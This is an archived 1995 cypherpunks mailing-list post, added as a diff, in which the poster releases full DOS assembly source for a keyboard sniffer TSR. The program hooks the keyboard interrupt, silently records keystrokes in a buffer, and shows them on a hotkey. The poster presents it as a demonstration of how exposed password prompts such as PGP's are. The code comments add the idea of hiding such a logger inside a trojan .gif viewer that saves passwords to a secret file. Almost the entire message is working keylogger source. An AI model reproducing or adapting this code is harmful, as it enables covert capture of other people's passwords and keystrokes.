@@ -1,0 +1,633 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: keyboard sniffer TSR source code... -->
+<!--X-From-R13: z00012NYO@UO.EFQZAGR.[EGE.SRG -->
+<!--X-Date: Wed, 11 Jan 95 23:02:56 PST -->
+<!--X-Message-Id: 0098A540.BC444360.1303@KANGA.STCLOUD.MSUS.EDU -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>keyboard sniffer TSR source code...</TITLE>
+<LINK REV="made" HREF="mailto:m00012@KANGA.STCLOUD.MSUS.EDU">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg00564.html">Date Prev</A>][<A HREF="msg00574.html">Date Next</A>][<A HREF="msg00568.html">Thread Prev</A>][<A HREF="msg00579.html">Thread Next</A>][<A HREF="index.html#00572">Date Index</A>][<A HREF="threads.html#00572">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>keyboard sniffer TSR source code...</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:cypherpunks@toad.com">cypherpunks@toad.com</A></LI>
+<LI><em>Subject</em>: keyboard sniffer TSR source code...</LI>
+<LI><em>From</em>: <A HREF="mailto:m00012@KANGA.STCLOUD.MSUS.EDU">m00012@KANGA.STCLOUD.MSUS.EDU</A></LI>
+<LI><em>Date</em>: Thu, 12 Jan 1995 01:03:11 CST</LI>
+<LI><em>Cc</em>: <A HREF="mailto:prz@acm.org">prz@acm.org</A></LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@toad.com">owner-cypherpunks@toad.com</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+For Dos operating systems.
+
+I wrote this in a weekend, and no longer wish to work with it.  
+
+I will release it as is....do not ask for support, and if you know 
+where I work, they have no idea I am doing this, so don't make
+any assumptions about my company's software.
+
+But, here it is, the source code for a keyboard sniffer program.
+
+After you assemble it, link it, turn it into a .com file, and 
+execute it, just hit &lt;alt&gt; page up for a display of the first
+half of the buffer, and &lt;alt&gt; page down for a display of the
+second half of the buffer.
+
+Then, test it out with pgp or other dos based programs that ask
+you for a password (use a fake one), and you will probably see
+how insecure most of these programs are.
+
+Mike
+-----cut here----
+; Keyboard sniffer TSR
+;
+; asm kbs.asm
+; link kbs.obj
+; exe2bin kbs kbs.exe
+;
+;Notes:  This is a keyboard sniffer program.  It is intended to
+;        show how easy it is to make your computer insecure.
+ 
+; This program hooks itself to the keyboard interrupt routine.
+ 
+; It is not difficult to imagine a routine that simply replaced
+; the keyboard interrupt routine, or simply monitored the
+; keyboard buffer and pointers from another interrupt routine,
+; e.g., the timer interrupt.
+ 
+; It is also not a stretch of the imagination to say that it is
+; possible that a program that monitors the keyboard buffer and
+; display area for things that look like passwords (e.g., look
+; for certain prompts, store next 500 characters) to either an
+; unused area of the disk, or a hidden file, already exists.
+ 
+;  That is to say, the FBI, for example, could have already
+; hired some programmers to come up with a .gif viewer that
+; also attaches a keyboard sniffer to your system snooping
+; for passwords, in the hopes that if and when the find a
+; suspected (fill-in-the-blank) "crimminal", all they have
+; to do is find the secret file created with their trojan TSR.
+ 
+;
+;
+;
+;
+ 
+KB_INT_NUM        EQU     9     ;keyboard interrupt
+BUFFER_SIZE       EQU     0b94H  ;our buffer size, 19 lines 2 buffers
+ 
+TLC             EQU     0C9H    ;top left corner
+HL              EQU     0CDH    ;horizontal line
+TRC             EQU     0BBH    ;top right corner
+VL              EQU     0BAH    ;vertical line
+BLC             EQU     0C8H    ;bottom left corner
+BRC             EQU     0BCH    ;bottom right corner
+LCT             EQU     0CCH    ;left center tap
+RCT             EQU     0B9H    ;right center tap
+ 
+ALTPGUP         EQU     9900H
+ALTPGDN         EQU     0A100H
+ 
+ROM_BIOS_DATA   SEGMENT AT 40H                  ;bios statuses and kb buffer
+        ORG             1AH                     ;absolute
+        KB_HEAD         DW      ?               ;head of kb buffer
+        KB_TAIL         DW      ?               ;tail of kb buffer
+        KB_BUFFER       DW      16 DUP (?)      ;The keyboard buffer
+        KB_BUFFER_END   LABEL   WORD
+ROM_BIOS_DATA   ENDS
+ 
+CODE_SEG        SEGMENT
+        ASSUME  CS:CODE_SEG
+        ORG     100H                          ; .com file
+FIRST:  JMP     INSTALL_INTERRUPTS_MAIN
+ 
+; data area...
+ 
+        buffer  db      BUFFER_SIZE dup ('*')
+        head    dw      5
+        tail    dw      5
+        cnt     dw      ?
+        ind     dw      ?
+        show_buff       dw      0
+        lkb_tail        dw      0       ;last key board til
+                                        ;this is for programs that leave
+                                        ;the character in bios buffer
+                                        ;past one interrupt, e.g., pgp
+        OLD_KB_INTERRUPT   LABEL   WORD
+        OLD_KB_INTERRUPT_ADDR      DD      ?
+        row     db      ?
+        idstring        db      "0x5fcf9eb78a01ef28"   ;18 long
+KBINTERRUPT    PROC    NEAR
+        ASSUME  CS:CODE_SEG
+        PUSH    AX
+        PUSH    BX
+        PUSH    CX
+        PUSH    DX
+        PUSH    DI
+        PUSH    SI
+        PUSH    DS
+        PUSH    ES
+        PUSHF
+        CALL    OLD_KB_INTERRUPT_ADDR
+ 
+        CLI
+ 
+ASSUME  DS:ROM_BIOS_DATA
+        MOV     BX,ROM_BIOS_DATA
+        MOV     DS,BX           ; point ds to ROM_BIOS_AREA...
+ 
+        MOV     BX,KB_TAIL
+        CMP     BX,KB_HEAD
+        JE      nogo1           ;origianal keyboard interrupt has deleted char
+        jmp     short go1
+        mov     cx,bx
+nogo1:  jmp     kbexit2    ;too far for je...
+ 
+go1:    ;check to see if we already processed this character
+        mov     cx,bx
+ASSUME DS:CODE_SEG
+        mov     bx,cs
+        mov     ds,bx
+ 
+        cmp     cx,lkb_tail ;is it the same as last time?
+        jne     go3  ;no
+ASSUME  DS:ROM_BIOS_DATA
+        MOV     BX,ROM_BIOS_DATA
+        mov     ds,bx
+        jmp     kbexit2
+go3:
+        mov     lkb_tail,cx     ;save new tail
+ASSUME  DS:ROM_BIOS_DATA
+        MOV     BX,ROM_BIOS_DATA
+        mov     ds,bx
+        mov     bx,cx
+ 
+        SUB     BX,2
+        CMP     BX,OFFSET KB_BUFFER     ;did we wrap around?
+        JAE     NO_WRAP                 ;no
+ 
+        MOV     BX,OFFSET KB_BUFFER_END ;yes
+        SUB     BX,2
+ 
+NO_WRAP:MOV     DX,[BX] ;        char in DX now...
+ 
+        CMP     DX,ALTPGUP      ;altpgup hit?
+        jne     checknext1      ;no
+        jmp     short   go2     ;yes, display first half of buffer
+ 
+checknext1: CMP DX,ALTPGDN      ;altpgdn hit?
+        jne     nogo2           ;no
+        mov     kb_tail,bx      ;delete alt pgdn from kb_buffer
+assume ds:code_seg
+        mov     cx,bx
+        mov     bx,cs
+        mov     ds,bx
+        xor     bx,bx           ;garbage last tail
+        mov     lkb_tail,bx
+        mov     bx,offset buffer;yes, display second half of buffer
+        add     bx,BUFFER_SIZE/2
+        mov     show_buff,bx
+        call    dump_buffer     ;dump second half
+        jmp     kbexit1
+ 
+nogo2:  jmp     save_key        ;too far for jne..
+ 
+go2:
+assume ds:rom_bios_data
+        mov     cx,bx
+        mov     bx,rom_bios_data
+        mov     ds,bx
+        mov     bx,cx
+        mov     kb_tail,bx      ;delete '&lt;alt&gt; pgup' from kb_buffer
+assume ds:code_seg
+        mov     cx,bx
+        mov     bx,cs
+        mov     ds,bx
+        xor     bx,bx           ;garbage last tail
+        mov     lkb_tail,bx
+        mov     bx,offset buffer        ;first half buffer
+        mov     show_buff,bx
+        call    dump_buffer     ;dump first half
+        jmp     kbexit1
+ 
+save_key:
+ 
+ASSUME  DS:CODE_SEG
+        MOV     BX,CS
+        MOV     DS,BX
+ 
+        mov     bx,offset buffer
+        add     bx,head
+        mov     [bx],dl ;dh?
+        inc     bx
+ 
+        mov     cx,offset buffer
+        add     cx,BUFFER_SIZE
+        cmp     bx,cx           ; at end of buffer?
+        jz      wrap_it         ; yes
+ 
+        sub     bx,offset buffer
+        mov     head,bx
+        jmp     kbexit1
+ 
+wrap_it:        xor bx,bx
+        mov     head,bx
+        jmp     kbexit1
+ 
+kbexit1:
+ 
+ASSUME  DS:ROM_BIOS_DATA
+        MOV     BX,ROM_BIOS_DATA
+        MOV     DS,BX
+kbexit2:        POP     ES
+        POP     DS
+        POP     SI
+        POP     DI
+        POP     DX
+        POP     CX
+        POP     BX
+        POP     AX
+        STI
+        IRET
+KBINTERRUPT    ENDP
+ 
+dump_buffer     PROC    NEAR
+ASSUME  DS:CODE_SEG
+        MOV     BX,CS
+        MOV     DS,BX
+        STI
+ 
+        jmp     over_data
+ 
+        sl1     db      "                           Keyboard Sniffer Program                           ",0
+        sl2     db      " Short Circuit, Inc.                  Version:  0.72 (Beta), (C)opyright 1995 ",0
+ 
+over_data:      mov     dh,0    ;row
+        mov     dl,0    ;column
+        mov     bh,0    ;page
+        mov     ah,2    ;service
+        int     10h     ;set cursor position
+ 
+        mov     bh,0    ;page
+        mov     cx,1    ;count?
+        mov     al,TLC  ;top left corner
+        mov     ah,0ah  ;service
+        int     10h
+ 
+        mov     dh,0    ;row
+        mov     dl,4fh  ;column = 79 dec
+        mov     bh,0    ;page
+        mov     ah,2    ;service
+        int     10h     ;set cursor position
+ 
+        mov     bh,0    ;page
+        mov     cx,1    ;count?
+        mov     al,TRC  ;top right corner
+        mov     ah,0ah  ;service
+        int     10h
+ 
+        mov     dh,17h  ;row
+        mov     dl,0    ;column
+        mov     bh,0    ;page
+        mov     ah,2    ;service
+        int     10h     ;set cursor position
+ 
+        mov     bh,0    ;page
+        mov     cx,1    ;count?
+        mov     al,BLC  ;bottom left corner
+        mov     ah,0ah  ;service
+        int     10h
+ 
+        mov     dh,17h  ;row
+        mov     dl,4fh  ;column=79 dec
+        mov     bh,0    ;page
+        mov     ah,2    ;service
+        int     10h     ;set cursor position
+ 
+        mov     bh,0    ;page
+        mov     cx,1    ;count?
+        mov     al,BRC  ;bottom right corner
+        mov     ah,0ah  ;service
+        int     10h
+ 
+        mov     cx,4eh  ;78 dec
+ 
+        mov     dh,0    ;row
+        mov     dl,1    ;column
+        mov     bh,0    ;page
+        mov     ah,2    ;service
+        int     10h     ;set cursor position
+ 
+        mov     bh,0    ;page
+        mov     cx,4eh  ; 78 characters
+        mov     al,HL   ;horizontal line
+        mov     ah,0ah  ;service
+        int     10h     ;put char
+ 
+        mov     dh,3    ;row
+        mov     dl,1    ;column
+        mov     bh,0    ;page
+        mov     ah,2    ;service
+        int     10h     ;set cursor position
+ 
+        mov     bh,0    ;page
+        mov     cx,4eh  ; 78 characters
+        mov     al,HL   ;horizontal line
+        mov     ah,0ah  ;service
+        int     10h     ;put char
+ 
+        mov     dh,17h  ;row
+        mov     dl,1
+        mov     bh,0    ;page
+        mov     ah,2    ;service
+        int     10h     ;set cursor position
+ 
+        mov     bh,0    ;page
+        mov     cx,4eh  ;count
+        mov     al,HL   ;horizontal line
+        mov     ah,0ah  ;service
+        int     10h     ;put char
+ 
+        mov     cx,16h  ;22 lines
+dline:  mov     dh,cl   ;row
+        mov     dl,0    ;column
+        mov     bh,0    ;page
+        mov     ah,2    ;service
+        int     10h     ;set cursor position
+ 
+        mov     dx,cx   ;save cx
+        mov     bh,0    ;page
+        mov     cx,1    ;count
+        mov     al,VL   ;vertical line
+        mov     ah,0ah  ;service
+        int     10h
+        mov     cx,dx   ;restore cx
+ 
+        mov     dh,cl   ;row
+        mov     dl,4fh  ;column
+        mov     bh,0    ;page
+        mov     ah,2    ;service
+        int     10h     ;set cursor position
+ 
+        mov     dx,cx   ;save cx
+        mov     bh,0    ;page
+        mov     cx,1    ;count
+        mov     al,VL   ;vertical line
+        mov     ah,0ah  ;service
+        int     10h
+        mov     cx,dx   ;restore cx
+        loop    dline
+ 
+        mov     dh, 3h  ;row
+        mov     dl, 0
+        mov     bh, 0   ;page
+        mov     ah, 2   ;service
+        int     10h     ;set cursor position
+ 
+        mov     bh, 0   ;page
+        mov     cx, 1   ;count
+        mov     al,LCT  ;horizontal line
+        mov     ah,0ah  ;service
+        int     10h     ;put char
+ 
+ 
+        mov     dh, 3h  ;row
+        mov     dl, 4fh ;column
+        mov     bh, 0   ;page
+        mov     ah, 2   ;service
+        int     10h     ;set cursor position
+ 
+        mov     bh, 0   ;page
+        mov     cx, 1   ;count
+        mov     al,RCT  ;horizontal line
+        mov     ah,0ah  ;service
+        int     10h     ;put char
+ 
+ 
+ 
+        mov     cx, BUFFER_SIZE/2 -1 ;going backwards...
+        mov     ind, cx
+        mov     cl, 13h
+ 
+dorows: mov     row, cl
+        mov     cx, 4eh
+ll0:    mov     cnt, cx
+        mov     dl, cl  ;to end of line
+        ;inc     dl     ;cnt was 1 too small
+        mov     dh,row
+        inc     dh
+        inc     dh
+        inc     dh
+        mov     ah,2            ;set cursor position
+        mov     bh,0            ;page 0
+        int     10h             ;move to 0,0
+ 
+        mov     bx,show_buff    ;show_buff points to correct half...
+        add     bx,ind          ;ind must have index, *(show_buff + ind)
+        mov     al,[bx]
+        mov     bh,0
+        mov     cx,1
+        mov     ah,0ah
+        int     10h
+        dec     ind             ;decrement index
+        mov     cx,cnt
+        loop ll0
+        mov     cl,row
+        dec     cl
+        jnz     dorows
+ 
+ 
+        mov     dh,1
+        mov     dl,1
+        mov     bx,offset sl1
+        call    print_string
+        mov     dh,2
+        mov     dl,1
+        mov     bx,offset sl2
+        call    print_string
+ 
+        mov     dh,18h
+        mov     dl,4
+        mov     bh,0
+        mov     ah,2
+        int     10h     ;move back to correct position
+ 
+        ret
+dump_buffer     ENDP
+ 
+print_string    PROC    NEAR
+        ;assumes ds==cs
+        ;null terminated string, address in bx...
+        ;row in dh
+        ;col in dl
+        ;uses bios int 10h, safe for tsr programs...
+        jmp     over_local_ps
+        sadd    dw      ?
+over_local_ps:
+        mov     sadd,bx
+ 
+np:     mov     bh,0
+        mov     ah,2
+        int     10h
+        mov     bx,sadd
+        mov     al,[bx]
+        cmp     al,0    ;is it 0?
+        je      pse     ;yes, return
+        inc     bx
+        mov     sadd,bx
+        inc     dl
+        mov     bh,0
+        mov     cx,1
+        mov     ah,0ah
+        int     10h
+        jmp     np      ;next print (next character)
+pse:    ret             ;done, encountered 0
+print_string    ENDP
+ 
+ 
+ 
+; Anything before this point stays in memory if it's okay to install...
+ 
+ 
+; tests to see if kbs is already installed, returns
+; zf=1 if it was already installed.
+; zf=0 if it has not been previously installed.
+kbia      PROC    NEAR
+	;assumes ds points to code segment...
+	MOV	AH, 35H 		;put old vector into es:bx
+	MOV	AL,KB_INT_NUM
+	INT	21H
+ 
+        mov     si,offset idstring      ;ds:si points to our string
+        mov     di,bx
+        sub     di, 12h                 ;es:di points to other string?
+        mov     cx,12h
+        REPE    cmpsb
+        ret
+kbia endp
+ 
+ 
+INSTALL_INTERRUPTS_MAIN       PROC    NEAR
+ 
+ASSUME  DS:CODE_SEG
+                mov     bx,cs
+                mov     ds,bx
+                xor     bx,bx
+                mov     head,bx
+                mov     tail,bx
+                jmp     over_temp_data
+                instg           db      "Kbs installed.",0dh,0ah,"$"
+                notinstg        db      "Kbs already installed.",0dh,0ah,"$"
+over_temp_data: call    kbia
+                je      dont_install_it
+                jmp     install_it
+dont_install_it:
+                mov     dx,offset notinstg
+                mov     ah,09h
+                int     21h
+                mov     bx,cs
+                mov     es,bx
+                int     20h
+ 
+install_it:     MOV     AH, 35H                 ;put old vector into es:bx
+                MOV     AL,KB_INT_NUM
+                INT     21H
+ 
+                MOV     OLD_KB_INTERRUPT,BX
+                MOV     OLD_KB_INTERRUPT[2],ES
+ 
+                MOV     AH,25H                  ;set new keyboard interrupt
+                LEA     DX,KBINTERRUPT
+                INT     21H
+ 
+                mov     dx,offset instg
+                mov     ah,09h
+                int     21h
+ 
+ASSUME  DS:ROM_BIOS_DATA
+        MOV     BX,ROM_BIOS_DATA
+        MOV     DS,BX
+        mov     cx,KB_TAIL
+ 
+ASSUME  DS:CODE_SEG
+        MOV     BX,CS
+        MOV     DS,BX
+        mov     lkb_tail,cx
+ 
+ 
+        MOV     DX, offset kbia         ;ds:dx end of stay resident
+        INT     27H                     ;allocate and stay resident
+ 
+INSTALL_INTERRUPTS_MAIN       ENDP
+ 
+ 
+CODE_SEG        ENDS
+ 
+        END     FIRST
+ 
+; P.S.  I haven't programmed in asm in a long time, no fair flaming
+;me for poor programming style/ineffecient code.
+; Use this code at your own rish.
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<UL><LI><STRONG>Follow-Ups</STRONG>:
+<UL>
+<LI><STRONG><A NAME="00579" HREF="msg00579.html">Re: keyboard sniffer TSR source code...</A></STRONG>
+<UL><LI><EM>From:</EM> Censored Girls Anonymous &lt;carolb@barton.spring.com&gt;</LI></UL></LI>
+</UL></LI></UL>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg00564.html">Re: How do I know if its encrypted?</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg00574.html">RE: How do I know if its encrypted?</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg00568.html">Re: Microsoft TrueName (tm)</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg00579.html">Re: keyboard sniffer TSR source code...</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#00572"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#00572"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
